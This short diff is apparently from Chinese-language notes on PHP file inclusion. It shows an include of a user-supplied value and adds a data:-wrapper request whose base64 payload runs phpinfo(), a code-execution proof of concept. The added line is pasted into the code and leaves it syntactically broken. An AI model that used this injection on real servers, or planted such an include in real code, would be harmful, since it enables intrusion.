@@ -53,7 +53,7 @@ $b="url";
 $c=cc();
 $aa = $c;
 
-include($aa);
+include($aa); include.php?url=data:image/png;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
 
 2.使用php扩展
 https://github.com/phith0n/arbitrary-php-extension
